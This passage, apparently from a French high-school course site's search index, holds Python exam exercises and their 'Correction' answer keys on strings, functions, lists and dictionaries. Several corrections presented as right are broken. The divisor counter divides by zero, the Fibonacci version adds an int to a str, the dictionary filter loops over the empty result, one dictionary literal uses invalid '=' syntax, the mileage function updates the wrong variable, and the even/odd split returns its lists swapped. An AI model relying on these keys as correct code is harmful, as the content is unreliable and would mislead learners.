phrase demand\u00e9 \u00e0 l'utilisateur (stock\u00e9 dans une cha\u00eene de caract\u00e8res). Exemple : Pour l'entr\u00e9e \"Python\" le programme affichera <code>4 consonnes</code>.</p> <p>Correction</p> <pre><code>    chaine = input(\"Donnez une phrase\")\n    consonnes = 0\n    # Par simplicit\u00e9 on ne mettra que les minuscules\n    for lettre in chaine:\n        if lettre != 'a' and lettre != 'e' and lettre != 'i' and lettre != 'o' and lettre != 'u' and lettre != ' ':\n            consonnes = consonnes + 1\n    '''\n    L'op\u00e9rateur in permet d'\u00e9valuer la pr\u00e9sence d'un caract\u00e8re dans une chaine de caract\u00e8res.\n    On aurait pu aussi faire :\n\n    for lettre in chaine:\n        if lettre in \"bcdfghjklmnpqrstvwxz\":\n            consonnes = consonnes + 1\n    '''\n    print(consonnes)\n</code></pre> <p>4) \u00c9crire un programme qui affiche les caract\u00e8res d'une cha\u00eene de caract\u00e8res demand\u00e9e par l'utilisateur dans l'autre sens. Exemple : Pour l'entr\u00e9e \"kayak\" le programme affichera <code>kayak</code>.</p> <p>Correction</p> <pre><code>    chaine = input(\"Donnez une phrase\")\n    res = \"\"\n    for lettre in chaine:\n        res = lettre + res\n    print(res)\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_4/","title":"Interrogation : Fonctions en python","text":"<p>L'\u00e9valuation porte sur 3 exercices ind\u00e9pendants. Les exercices sont not\u00e9s sur 18 et la rigueur, r\u00e9daction et justifications sont not\u00e9s sur 2 points. La pr\u00e9sence des  en-t\u00eates de fonctions ou documentations compte dans les deux points de rigueur.</p>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_4/#exercice-1-etude-de-fonction-suite-de-fibonacci-et-bonnes-pratiques-3-points","title":"Exercice 1 : \u00c9tude de fonction : Suite de Fibonacci et Bonnes pratiques (3 points)","text":"<p>La suite de Fibonacci est une s\u00e9quence de nombres o\u00f9 chaque terme est la somme des deux termes pr\u00e9c\u00e9dents.  </p> <p>Elle commence g\u00e9n\u00e9ralement par 0 et 1, puis chaque terme suivant est calcul\u00e9 comme :</p> <p>\\(F(n) = F(n-1) + F(n-2)\\) \\(\\(F(0) = 0 \\newline F(1) = 1 \\newline F(2) = 1 + 0 = 1 \\newline F(3) = 1 + 1 = 2 \\newline \\cdots\\)\\)</p> <pre><code>    def f(n):\n        x = 0\n        y = 1\n        chaine = ''\n        for i in range(n):\n            print(x)\n            y = x + y\n            x = y - x\n</code></pre> <p>Cette fonction ne r\u00e9pond pas aux bonnes pratiques de d\u00e9veloppement.</p> <p>1) Quels principes des bonnes pratiques de d\u00e9veloppement ne sont pas respect\u00e9s par cette fonction? Les corriger.</p> <p>Correction</p> <p>Le nom de la fonction n'est pas explicite, les noms de variable non plus. La signature de fonction ou la sp\u00e9cification n'est pas non plus pr\u00e9sente.</p> <p>2) Quels sont les affichages r\u00e9alis\u00e9s dans la boucle lorsque l'on souhaite afficher <code>f(7)</code></p> <p>Correction</p> <pre><code>&gt;&gt;&gt; f(7)\n0\n1\n1\n2\n3\n5\n8\n</code></pre> <p>3) Modifier la fonction en ajoutant chacune des valeurs de <code>x</code> dans la cha\u00eene de caract\u00e8res <code>chaine</code> et la renvoyer. (Si possible rajouter un espace \u00e0 chaque it\u00e9ration dans <code>chaine</code>.)</p> <p>Correction</p> <pre><code>    def fibonacci(n:int)-&gt; None:\n        x = 0\n        y = 1\n        chaine = ''\n        for i in range(n):\n            chaine = chaine + x + ' '\n            y = x + y\n            x = y - x\n        return chaine\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_4/#exercice-2-completion-de-code-3-points","title":"Exercice 2 : Compl\u00e9tion de code (3 points)","text":"<p>Compl\u00e9ter la fonction <code>nombres_diviseurs</code> qui prend en param\u00e8tre un entier et renvoie son nombre de diviseurs. Rappel : Un chiffre/nombre A est un diviseur d'un autre nombre B si le reste de la division euclidienne de B par A est 0. L'op\u00e9rateur <code>%</code> permet d'avoir le reste de la division de deux nombres. Exemple : nombre_diviseurs(6) doit renvoyer 4 (car ses diviseurs sont 1,2,3 et 6). nombre_diviseurs(10) doit renvoyer 4 (car ses diviseurs sont 1,2,5 et 10). </p> <pre><code>    def nombres_diviseurs(n : int) -&gt; int:\n        compteur = ...\n        for i in range(...):\n            if ... :\n                compteur = ...\n        return ...\n</code></pre> <p>Correction</p> <pre><code>def nombres_diviseurs(n : int) -&gt; int:\n    compteur = 0\n    for i in range(n):\n        if n % i == 0 :\n            compteur = compteur + 1\n    return compteur\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_1/correction_interro_4/#exercice-3-ecriture-de-programmes-simples-12-points","title":"Exercice 3 : \u00c9criture de programmes simples (12 points)","text":"<p>\u00c9crire une fonction <code>puissance_nombre</code> qui prend en param\u00e8tres deux entiers par exemple a et b et renvoie a \u00e0 la puissance b. Contrainte : Vous ne devez pas utiliser l'op\u00e9rateur <code>**</code> mais utiliser une boucle. Exemple : puissance_nombre(3,3) doit renvoyer 27. puissance_nombre(2,5) doit renvoyer 32.</p> <p>Correction</p> <pre><code>def puissance_nombre(a:int, b:int)-&gt;int:\n    res = 1\n    for i in range(b):\n        res = res * a\n    return res\n</code></pre> <p>\u00c9crire une fonction <code>valeur_absolue</code> qui prend en param\u00e8tre un entier et renvoie sa valeur absolue (entier). Rappel : La valeur absolue d'un nombre correspond \u00e0 la valeur positive du nombre. Si le nombre est positif, sa valeur absolue est la m\u00eame que sa valeur, s'il est n\u00e9gatif, elle correspond \u00e0 sa valeur positive. Exemple: valeur_absolue(8) doit renvoyer 8. valeur_absolue(-56) doit renvoyer 56.</p> <p>Correction</p> <pre><code>def valeur_absolue(a:int)-&gt;int:\n    if a &lt; 0 : \n        return -1 * a\n    else:\n        return a\n</code></pre> <p>\u00c9crire une fonction <code>somme_chiffres</code> qui prend en param\u00e8tre une cha\u00eene de caract\u00e8re repr\u00e9sentant un entier positif et renvoie la somme de ses chiffres (entier). Exemple : somme_chiffres('1234') doit renvoyer 10 (car 1+2+3+4 = 10). somme_chiffres('56789') doit renvoyer 35 (car 5+6+7+8+9 = 35)</p> <p>Correction</p> <pre><code>def somme_chiffres(chaine : str)-&gt;int:\n    res = 0\n    for chiffre in chaine:\n        res = res + int(chiffre)\n    return res\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_2/correction_ds_2/","title":"Devoir Surveill\u00e9 2 : Listes et Dictionnaires en Python","text":""},{"location":"premiere/Aides/Corrections/trimestre_2/correction_ds_2/#exercice-1-releves-de-temperatures-6-points","title":"Exercice 1 : Relev\u00e9s de temp\u00e9ratures (6 points)","text":"<p>Moyenne des temp\u00e9ratures</p> <pre><code>def moyenne(temperatures: list) -&gt; float:\n    if len(temperatures) == 0:\n        return 0\n    total = 0\n    for temp in temperatures:\n        total += temp\n    return total / len(temperatures)\n</code></pre> <p>Maximum et jour</p> <pre><code>def max_temperature(temperatures: list) -&gt; tuple:\n    temp_max = temperatures[0]\n    jour = 1\n    for i in range(len(temperatures)):\n        if temperatures[i] &gt; temp_max:\n            temp_max = temperatures[i]\n            jour = i + 1\n    return (temp_max, jour+1)\n</code></pre> <p>Jours au-dessus du seuil</p> <pre><code>def jours_au_dessus_de(temperatures: list, seuil: float) -&gt; list:\n    jours = []\n    for i in range(len(temperatures)):\n        if temperatures[i] &gt; seuil:\n            jours.append(i + 1)\n    return jours\n</code></pre> <p>Liste sans valeur</p> <pre><code>def liste_sans_valeur(temperatures: list, valeur: float) -&gt; list:\n    nouvelle_liste = []\n    for t in temperatures:\n        if t != valeur:\n            nouvelle_liste.append(t)\n    return nouvelle_liste\n</code></pre> <p>Recherche de voiture</p> <pre><code>def recherche_voiture(concessionnaire: list, modele: str) -&gt; list:\n    voitures_trouvees = []\n    for voiture in concessionnaire:\n        if voiture[\"modele\"] == modele:\n            voitures_trouvees.append(voiture)\n    return voitures_trouvees\n</code></pre> <p>Soldes par \u00e9nergie</p> <pre><code>def soldes_prix_energie(concessionnaire: list, energie: str) -&gt; None:\n    for voiture in concessionnaire:\n        if voiture[\"energie\"] == energie:\n            voiture[\"prix\"] -= 2500\n</code></pre> <p>Prix moyen</p> <pre><code>def prix_moyen(concessionnaire: list, energie: str) -&gt; float:\n    total = 0\n    count = 0\n    for voiture in concessionnaire:\n        if voiture[\"energie\"] == energie:\n            total += voiture[\"prix\"]\n            count += 1\n    if count == 0:\n        return 0\n    return total / count\n</code></pre> <p>Mod\u00e8le le plus cher</p> <pre><code>def modele_le_plus_cher(concessionnaire: list) -&gt; str:\n    plus_cher = concessionnaire[0]\n    for voiture in concessionnaire:\n        if voiture[\"prix\"] &gt; plus_cher[\"prix\"]:\n            plus_cher = voiture\n    return plus_cher[\"modele\"]\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_2/correction_ds_2/#exercice-3-gestion-dun-refuge-de-renards-6-points","title":"Exercice 3 : Gestion d'un Refuge de Renards (6 points)","text":"<p>Ajouter un renard</p> <pre><code>def ajouter_renard_listes(renards: list, nouveau_renard: list) -&gt; None:\n    renards.append(nouveau_renard)\n</code></pre> <p>Modifier un renard</p> <pre><code>def modifier_renard_listes(renards: list, id: int, nom: str, race: str) -&gt; None:\n    for renard in renards:\n        if renard[0] == id:\n            renard[1] = nom\n            renard[3] = race\n</code></pre> <p>Afficher les renards rouges</p> <pre><code>def afficher_renards_rouges(renards: list) -&gt; None:\n    for renard in renards:\n        if renard[3] == \"Rouge\":\n            print(renard)\n</code></pre> <p>Explication liste vs dictionnaire</p> <p>Dans une liste de listes, il faut conna\u00eetre l'indice exact de chaque information (nom \u00e0 l'indice 1, race \u00e0 l'indice 3, etc.). Cela rend le code moins lisible et plus sujet aux erreurs. De plus, si on veut ajouter une nouvelle information, il faut modifier tous les endroits o\u00f9 on manipule ces listes.</p> <p>Avec un dictionnaire, on acc\u00e8de aux informations par leur nom (\"nom\", \"race\", etc.), ce qui rend le code plus lisible et plus facile \u00e0 maintenir. On peut aussi facilement ajouter de nouvelles informations sans impacter le code existant.</p> <p>Conversion en dictionnaires</p> <pre><code>def listes_listes_vers_listes_dict(renards: list) -&gt; list:\n    cles = ['id', 'nom', 'espece', 'race', 'sexe']\n    resultat = []\n    for renard in renards:\n        nouveau_dict = {}\n        for i in range(len(cles)):\n            nouveau_dict[cles[i]] = renard[i]\n        resultat.append(nouveau_dict)\n    return resultat\n</code></pre> <p>Modification version dictionnaire</p> <pre><code>def modifier_renard_dict(renards_dict: list, id: int, nom: str, race: str) -&gt; None:\n    for renard in renards_dict:\n        if renard['id'] == id:\n            renard['nom'] = nom\n            renard['race'] = race\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_2/correction_interro_5/","title":"Interrogation : Listes en python","text":"<p>L'\u00e9valuation porte sur 3 exercices ind\u00e9pendants. Les exercices sont not\u00e9s sur 18 et la rigueur, r\u00e9daction et justifications sont not\u00e9s sur 2 points.</p>"},{"location":"premiere/Aides/Corrections/trimestre_2/correction_interro_5/#exercice-1-questions-de-cours-2-points","title":"Exercice 1 : Questions de cours (2 points)","text":"<ol> <li>On peut it\u00e9rer sur 2 propri\u00e9t\u00e9s d'une liste \u00e0 l'aide d'une boucle <code>for</code>. Quelles sont ces 2 propri\u00e9t\u00e9s ?</li> </ol> <p>Correction</p> <p>Indices (<code>for i in range(len(liste))</code>) Valeurs (<code>for elt in liste</code>)</p> <ol> <li>Une propri\u00e9t\u00e9 pr\u00e9c\u00e9dente permet de localiser la position dans une liste. Quelle est la position de l'\u00e9l\u00e9ment l[0]? l[4]?</li> </ol> <p>Correction</p> <p>position 1 pour l'\u00e9l\u00e9ment l[0] position 5 pour l'\u00e9l\u00e9ment l[4]</p> <ol> <li>Peut-on modifier les \u00e9l\u00e9ments d'une liste ? d'un tuple ?</li> </ol> <p>Correction</p> <p>On peut modifier pour une liste mais pas un tuple (non-mutable)</p>"},{"location":"premiere/Aides/Corrections/trimestre_2/correction_interro_5/#exercice-2-completion-de-programme-4-points","title":"Exercice 2 : Compl\u00e9tion de programme (4 points)","text":"<p>Compl\u00e9ter la fonction <code>rangement_valeurs</code> qui prend en param\u00e8tre une liste et un \u00e9l\u00e9ment, et renvoie 3 listes : une liste contenant les valeurs inf\u00e9rieures \u00e0 l\u2019\u00e9l\u00e9ment, une liste avec l\u2019\u00e9l\u00e9ment si pr\u00e9sent, et une liste avec les valeurs sup\u00e9rieures. Exemple : <pre><code>rangement_valeurs([1, 7, 4, 3, 6, 2, 8], 5)  # Renvoie: [1, 4, 3, 2], [], [7, 6, 8]\nrangement_valeurs([1, 2, 4, 3, 6, 2, 8], 2)  # Renvoie: [1], [2, 2], [4, 3, 6, 8]\n</code></pre></p> <pre><code>    def rangement_valeurs(liste : list, valeur : int) -&gt; tuple(list):\n        inferieurs = []\n        superieures = []\n        egales = []\n        for ... :\n            if ... &gt; valeur :\n                superieures.append(valeur)\n            elif ... == ... :\n                egales = egales + [...]\n            else:\n                inferieures = inferieures + [...]\n        return ...\n</code></pre> <p>Correction</p> <pre><code>def rangement_valeurs(liste : list, valeur : int) -&gt; tuple(list[int]):\n    inferieures = []\n    superieures = []\n    egales = []\n    for elt in liste :\n        if elt &gt; valeur :\n            superieures.append(elt)\n        elif elt == valeur :\n            egales = egales + [elt]\n        else:\n            inferieures = inferieures + [elt]\n    return inferieures , egales , superieures\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_2/correction_interro_5/#exercice-3-ecriture-de-programme-12-points","title":"Exercice 3 : \u00c9criture de programme (12 points)","text":"<p>\u00c9crire une fonction <code>compter_pairs</code> qui prend une liste d'entiers et renvoie le nombre d'\u00e9l\u00e9ments pairs dans cette liste. Exemple : compter_pairs([1, 2, 3, 4, 5, 6]) doit renvoyer 3.</p> <p>Correction</p> <pre><code>def compter_pairs(liste:list)-&gt;int:\n    pairs = 0\n    for elt in liste:\n        if elt % 2 == 0:\n            pairs = pairs + 1\n    return pairs\n</code></pre> <p>\u00c9crire une fonction <code>moyenne</code> qui prend en param\u00e8tre une liste d'entiers et renvoie la moyenne de tous les nombres pr\u00e9sents dans cette liste. Exemple : moyenne([1, 2, 3, 4, 5]) doit renvoyer 3.0.</p> <p>Correction</p> <pre><code>def moyenne(liste:list[float])-&gt;float:\n    somme = 0\n    taille = len(liste)\n    for elt in liste:\n        somme = somme + elt\n    moyenne = somme / taille\n    return moyenne\n</code></pre> <p>\u00c9crire une fonction <code>somme_elements</code> qui prend une liste de nombres en param\u00e8tre et renvoie la somme de tous les \u00e9l\u00e9ments. Exemple : somme_elements([1, 2, 3, 4]) doit renvoyer 10.</p> <p>Correction</p> <pre><code>def somme_elements(liste:list[int])-&gt;int:\n    somme = 0\n    for elt in liste:\n        somme += elt\n    return somme\n</code></pre> <p>\u00c9crire une fonction <code>separer_pairs_impairs</code> qui prend une liste d'entiers et renvoie deux listes : une avec les \u00e9l\u00e9ments pairs et une autre avec les \u00e9l\u00e9ments impairs. Exemple : separer_pairs_impairs([1, 2, 3, 4, 5]) doit renvoyer ([2, 4], [1, 3, 5]).</p> <p>Correction</p> <pre><code>def separer_pairs_impairs(liste:list)-&gt;tuple[list[int]]:\n    impairs = []\n    pairs = []\n    for elt in liste:\n        if elt % 2 == 0:\n            pairs.append(elt)\n        else:\n            impairs.append(elt)\n    return impairs, pairs\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_2/correction_interro_7/","title":"Interrogation : Dictionnaires","text":"<p>L'\u00e9valuation porte sur 3 exercices ind\u00e9pendants. Les exercices sont not\u00e9s sur 18 et la rigueur, r\u00e9daction et justifications sont not\u00e9s sur 2 points.</p>"},{"location":"premiere/Aides/Corrections/trimestre_2/correction_interro_7/#exercice-1-questions-de-cours-2-points","title":"Exercice 1 : Questions de cours (2 points)","text":"<ol> <li>Un dictionnaire est un couple (... : ...). \u00c0 quoi correspondent chacun des ... ?</li> </ol> <p>{... / ...}</p> <p>Couple clef / valeur</p> <ol> <li>Cr\u00e9er le dictionnaire Python associ\u00e9 \u00e0 cet objet :</li> </ol> ville code postal departement region nombre d'habitants Vannes 56000, 56001,56002,56003 Morbihan Bretagne 54420 <p>Dictionnaire Vannes</p> <pre><code>    ville = {'nom':'Vannes',\n            'code_postal':[56000,56001,56002,56003],\n            'departement':'Morbihan',\n            'region':'Bretagne',\n            'nb_habitants':54420}\n</code></pre> <ol> <li>Donner l'instruction python qui permet de changer le nombre d'habitant de 54420 \u00e0 54532.</li> </ol> <p>Changer le nombre d'habitants</p> <pre><code>    ville['nb_habitants'] = 54532\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_2/correction_interro_7/#exercice-2-completion-de-programme-4-points","title":"Exercice 2 : Compl\u00e9tion de programme (4 points)","text":"<p>Compl\u00e9ter la fonction <code>filtrer_dictionnaire</code> qui prend en param\u00e8tre un dictionnaire et une valeur seuil, et renvoie un nouveau dictionnaire ne contenant que les \u00e9l\u00e9ments sup\u00e9rieurs \u00e0 cette valeur.</p> <p>Exemple :</p> <pre><code>    filtrer_dictionnaire({'a': 10, 'b': 5, 'c': 15, 'd': 3}, 7)  # Renvoie: {'a': 10, 'c': 15}\n    filtrer_dictionnaire({'x': 2, 'y': 8, 'z': 4}, 10)  # Renvoie: {}\n</code></pre> <pre><code>    def filtrer_dictionnaire(dico: dict, seuil: int) -&gt; dict:\n    resultat = {}\n    for ... :\n        if ... &gt; seuil:\n            resultat[...] = ...\n    return resultat\n</code></pre> <p>Compl\u00e9tion de code</p> <pre><code>    def filtrer_dictionnaire(dico:dict, seuil:int) -&gt; dict:\n        resultat = {}\n        for i in resultat:\n            if dico[i] &gt; seuil:\n                resultat[i] = dico[i]\n        return resultat\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_2/correction_interro_7/#exercice-3-ecriture-de-programmes-12-points","title":"Exercice 3 : \u00c9criture de programmes (12 points)","text":"<p>\u00c9crire une fonction compter_occurrences qui prend une liste et renvoie un dictionnaire o\u00f9 les cl\u00e9s sont les \u00e9l\u00e9ments de la liste et les valeurs sont leurs nombres d'occurrences. Exemple : compter_occurrences(['pomme', 'banane', 'pomme', 'cerise', 'banane', 'pomme']) doit renvoyer {'pomme': 3, 'banane': 2, 'cerise': 1}.</p> <p>Compter occurences</p> <pre><code>    def compter_occurences(liste: list)-&gt;dict:\n        resultat = {}\n        for i in liste:\n            if i not in resultat:\n                resultat[i] = 1\n            else:\n                resultat[i] = resultat[i] + 1\n        return resultat\n</code></pre> <p>\u00c9crire une fonction notes_par_appreciation qui prend un dictionnaire de notes et renvoie un nouveau dictionnaire classant les notes par appr\u00e9ciation.</p> <p>Crit\u00e8res de notation :</p> <p>Moins de 10 : \"Insuffisant\" Entre 10 et 12 : \"Passable\" Entre 12 et 14 : \"Bien\" Entre 14 et 16 : \"Tr\u00e8s bien\" 16 et plus : \"Excellent\"</p> <pre><code>    &gt;&gt;&gt; notes = {'Pierre': 15, 'Marie': 8, 'Jean': 13, 'Sophie': 17}\n    &gt;&gt;&gt; notes_par_appreciation(notes)\n    {\n         'Insuffisant': ['Marie'],\n         'Bien': ['Jean'],\n         'Tr\u00e8s bien': ['Pierre'],\n         'Excellent': ['Sophie']\n     }\n</code></pre> <p>Appr\u00e9ciations</p> <pre><code>    def notes_par_appreciations(notes:dict)-&gt;dict:\n        appreciations = {'Insuffisant'=[],\n                         'Passable' = [],\n                         'Bien' = [],\n                         'Tr\u00e8s Bien' = [],\n                         'Excellent' = []\n                        }\n        for nom in notes:\n            if notes[nom]&gt;= 16:\n                appreciations['Excellent'].append(nom)\n            elif notes[nom] &gt;= 14:\n                appreciations['Tr\u00e8s Bien'].append(nom)\n            elif notes[nom] &gt;= 12:\n                appreciations['Bien'].append(nom)\n            elif notes[nom] &gt;= 10:\n                appreciations['Passable'].append(nom)\n            else:\n                appreciations['Insuffisant'].append(nom)\n        return appreciations\n</code></pre> <p>\u00c9crire une fonction kilometre_max qui prend un dictionnaire et renvoie le nom de la voiture la plus kilom\u00e9tr\u00e9e. Exemple : trouver_max({'X1': 132000, 'Bayon': 25000, 'Paceman': 145000}) doit renvoyer 'Paceman'.</p> <p>Voiture la plus kilom\u00e9tr\u00e9e</p> <pre><code>    def kilometre_max(dico:dict)-&gt;str:\n        kilometrage = 0\n        voiture = None\n        for modele in dico:\n            if dico[modele] &gt; kilometrage:\n                kilometre = dico[modele]\n                voiture = modele\n        return voiture\n</code></pre> <p>\u00c9crire une fonction filtrer_par_cle qui prend un dictionnaire et une longueur minimale, et renvoie un nouveau dictionnaire ne contenant que les cl\u00e9s de longueur sup\u00e9rieure ou \u00e9gale \u00e0 la longueur donn\u00e9e. Exemple : filtrer_par_cle({'a': 1, 'abc': 2, 'de': 3, 'fghi': 4}, 3) doit renvoyer {'abc': 2, 'fghi': 4}.</p> <p>Filtrer les clefs</p> <pre><code>    def filtrer_par_clef(dico : dict, longueur:int)-&gt;dict:\n        resultat = {}\n        for clef in dico:\n            if len(clef) &gt;= longueur:\n                resultat[clef] = dico[clef]\n        return resultat\n</code></pre>"},{"location":"premiere/Aides/Corrections/trimestre_2/listes_dictionnaires/","title":"Devoir Surveill\u00e9 2 : Listes et Dictionnaires en Python","text":"<p>L'\u00e9valuation porte sur 3 exercices ind\u00e9pendants. Les exercices sont not\u00e9s sur 18 et la rigueur, r\u00e9daction,justifications et en-t\u00eates sont not\u00e9s sur 2 points.</p>"},{"location":"premiere/Aides/Corrections/trimestre_2/listes_dictionnaires/#exercice-1-releves-de-temperatures-6-points","title":"Exercice 1 : Relev\u00e9s de temp\u00e9ratures (6 points)","text":"<p>On dispose d\u2019une liste de relev\u00e9s de temp\u00e9ratures (en \u00b0C) sur un mois (15 jours). On consid\u00e8rera que le jour \u00e0 l'indice 0 est le jour 1.</p> <pre><code>    temperatures = [5, 6, 10, 10, 12, 15, 15, 16, 18, 19, 20, 20, 22, 25, 25]\n</code></pre> <p>1. \u00c9crire une fonction <code>moyenne</code> qui prend en param\u00e8tre une liste de temp\u00e9ratures et renvoie la valeur moyenne de la liste. Il faudra g\u00e9rer le cas o\u00f9 la liste serait vide. <pre><code>    &gt;&gt;&gt; moyenne(temperatures)\n    17.333333333333332\n</code></pre></p> <p>2. \u00c9crire une fonction <code>max_temperature</code> qui prend en param\u00e8tre une liste de temp\u00e9ratures et renvoie un tuple <code>(temperature_max, jour)</code>: <code>temperature_max</code> est la temp\u00e9rature la plus \u00e9lev\u00e9e de la liste et <code>jour</code> le jour auquel cette temp\u00e9rature appara\u00eet pour la premi\u00e8re fois (rappel, le jour \u00e0 l'indice 0 est le jour 1). <pre><code>    &gt;&gt;&gt; max_temperature(temperatures)\n    (25, 13)\n</code></pre></p> <p>3. \u00c9crire une fonction <code>jours_au_dessus_de</code> qui prend en param\u00e8tres une liste de temp\u00e9ratures et un seuil, et renvoie une liste des indices pour lesquels la temp\u00e9rature d\u00e9passe le seuil donn\u00e9. <pre><code>    &gt;&gt;&gt; jours_au_dessus_de(temperatures, 20)\n    [13, 14, 15]\n</code></pre></p> <p>4. \u00c9crire une fonction <code>liste_sans_valeur</code> qui prend en param\u00e8tres une liste de temp\u00e9ratures et une valeur, et renvoie une liste sans la valeur pass\u00e9e en param\u00e8tres. <pre><code>    &gt;&gt;&gt; supprimer_valeurs(temperatures, 20)\n    &gt;&gt;&gt; print(temperatures)\n    [5, 6, 10, 10, 12, 15, 15, 16, 18, 19, 22, 25, 25]\n</code></pre></p>"},{"location":"premiere/Aides/Corrections/trimestre_2/listes_dictionnaires/#exercice-2-gestion-dun-parc-automobile-6-points","title":"Exercice 2 : Gestion d'un parc automobile (6 points)","text":"<p>On dispose d\u2019une liste de dictionnaires repr\u00e9sentant un concessionnaire, chacun repr\u00e9sentant un mod\u00e8le de voiture : <pre><code>    concessionnaire = [\n        {\"modele\": \"BMW S\u00e9rie 1\", \"prix\": 27000, \"energie\": \"Essence\"},\n        {\"modele\": \"BMW X1\", \"prix\": 50000, \"energie\": \"Essence\"},\n        {\"modele\": \"Mini Cooper\", \"prix\": 22000, \"energie\": \"Essence\"},\n        {\"modele\": \"Mini Clubman\", \"prix\": 25000, \"energie\": \"Diesel\"},\n        {\"modele\": \"Mini Cooper\", \"prix\": 21000, \"energie\": \"Diesel\"}\n    ]\n</code></pre></p> <p>1. \u00c9crire une fonction <code>recherche_voiture</code> qui prend en param\u00e8tres un concessionnaire et un mod\u00e8le et qui renvoie une liste comportant tous les v\u00e9hicules du mod\u00e8le pass\u00e9 en param\u00e8tre. <pre><code>&gt;&gt;&gt; recherche_voiture(concessionnaire, \"Mini Cooper\")\n[{ \"modele\": \"Mini Cooper\", \"prix\": 22000, \"energie\": \"Essence\"},\n {\"modele\": \"Mini Cooper\", \"prix\": 21000, \"energie\": \"Diesel\"}]\n</code></pre></p> <p>2. \u00c9crire une fonction <code>soldes_prix_energie</code> qui prend en param\u00e8tres un concessionnaire et une energie et modifie le prix de ces mod\u00e8les en le r\u00e9duisant de 2500\u20ac.</p> <pre><code>    &gt;&gt;&gt; soldes_prix_energie(concessionnaire, \"Diesel\")\n    &gt;&gt;&gt; print(concessionnaire)\n    [   ...,\n        {\"modele\": \"Mini Clubman\", \"prix\": 22500, \"energie\": \"Diesel\"},\n        {\"modele\": \"Mini Cooper\", \"prix\": 18500, \"energie\": \"Diesel\"}]\n</code></pre> <p>3. \u00c9crire une fonction <code>prix_moyen</code> qui prend en param\u00e8tre un concessionnaire et une energie et qui renvoie le prix moyen des v\u00e9hicules de cette energie. <pre><code>&gt;&gt;&gt; prix_moyen(concessionnaire, \"Diesel\")\n23000\n</code></pre></p> <p>4. \u00c9crire une fonction <code>modele_le_plus_cher</code> qui prend en param\u00e8tre un concessionnaire et qui renvoie le mod\u00e8le le plus cher. <pre><code>&gt;&gt;&gt; modele_le_plus_cher(concessionnaire)\n\"BMW X1\"\n</code></pre></p>"},{"location":"premiere/Aides/Corrections/trimestre_2/listes_dictionnaires/#exercice-3-gestion-dun-refuge-de-renards-6-points","title":"Exercice 3 : Gestion d'un Refuge de Renards (6 points)","text":"<p>On dispose d\u2019une liste de listes pour stocker les informations des renards dans un refuge. Chaque sous-liste contient les informations suivantes : [identifiant, nom, esp\u00e8ce, race, sexe].</p> <p>Par exemple : <pre><code>    renards = [\n        [1, 'Foxy', 'Renard', 'Rouge', 'Femelle'],\n        [2, 'Rex', 'Renard', 'Arctique', 'M\u00e2le'],\n        [3, 'Coco', 'Renard', 'Rouge', 'M\u00e2le']\n    ]\n</code></pre></p> <p>1. \u00c9crire une fonction <code>ajouter_renard_listes</code> qui prend en param\u00e8tres la liste <code>renards</code> et une nouvelle liste <code>renard</code>, et qui ajoute cette sous-liste \u00e0 la liste. <pre><code>&gt;&gt;&gt; ajouter_renard_listes(renards, (4, 'Luna', 'Renard', 'Rouge', 'Femelle'))\n&gt;&gt;&gt; print(renards)\n[[1, 'Foxy', 'Renard', 'Rouge', 'Femelle'), (2, 'Rex', 'Renard', 'Arctique', 'M\u00e2le'], \n[3, 'Coco', 'Renard', 'Rouge', 'M\u00e2le'), (4, 'Luna', 'Renard', 'Rouge', 'Femelle']]\n</code></pre></p> <p>2. \u00c9crire une fonction <code>modifier_renard_listes</code> qui prend en param\u00e8tres la liste <code>renards</code>, un identifiant, un nouveau nom et une nouvelle race, et qui modifie le nom et la race du renard correspondant \u00e0 l\u2019identifiant donn\u00e9.</p> <pre><code>&gt;&gt;&gt; modifier_renard_listes(renards, 1, 'Fiona', 'Argent\u00e9')\n&gt;&gt;&gt; print(renards)\n[[1, 'Fiona', 'Renard', 'Argent\u00e9', 'Femelle'], (2, 'Rex', 'Renard', 'Arctique', 'M\u00e2le'],\n [3, 'Coco', 'Renard', 'Rouge', 'M\u00e2le']]\n</code></pre> <p>3. \u00c9crire une fonction <code>afficher_renards_rouges</code> qui prend en param\u00e8tre la liste <code>renards</code> et affiche uniquement les renards de la race \"Rouge\".</p> <pre><code>&gt;&gt;&gt; afficher_renards_rouges(renards)\n[1, 'Fiona', 'Renard', 'Rouge', 'Femelle']\n[3, 'Coco', 'Renard', 'Rouge', 'M\u00e2le']\n</code></pre> <p>4. Expliquer en quelques lignes pourquoi, d\u00e8s que l\u2019on souhaite effectuer de multiples modifications (changer seulement la race, ou seulement le nom, etc.) sur des champs pr\u00e9cis, une liste de listes devient peu pratique. Pourquoi un mod\u00e8le plus \u00ab flexible \u00bb est-il pr\u00e9f\u00e9rable pour des donn\u00e9es \u00e9volutives ?</p> <p></p> <p>On souhaite transformer cette liste de listes en liste de dictionnaires. Par exemple, chaque renard sera repr\u00e9sent\u00e9 par un dictionnaire du type :</p> <pre><code>{\n   'id': 1, 'nom': 'Fiona' 'espece': 'Renard', 'race': 'Rouge','sexe': 'Femelle'\n}\n</code></pre> <p>5. \u00c9crire une fonction <code>listes_listes_vers_listes_dict</code> qui renvoie une nouvelle liste de dictionnaires construite \u00e0 partir de la liste <code>renards</code>.</p> <pre><code>&gt;&gt;&gt; listes_listes_vers_listes_dict(renards)\n[\n    {'id': 1, 'nom': 'Fiona', 'espece': 'Renard', 'race': 'Rouge', 'sexe': 'Femelle'},\n    {'id': 2, 'nom': 'Rex', 'espece': 'Renard', 'race': 'Arctique', 'sexe': 'M\u00e2le'},\n    {'id': 3, 'nom': 'Coco', 'espece': 'Renard', 'race': 'Rouge', 'sexe': 'M\u00e2le'}\n]\n</code></pre> <p>6. R\u00e9\u00e9crire la fonction de modification pour qu\u2019elle fonctionne sur la liste de dictionnaires : La fonction <code>modifier_renard_dict</code> modifie directement les champs 'nom' et 'race' dans le dictionnaire correspondant. <pre><code>&gt;&gt;&gt; modifier_renard_dict(renards_dict, 1, 'Fiona', 'Argent\u00e9')\n&gt;&gt;&gt; print(renards_dict)\n[\n    {'id': 1, 'nom': 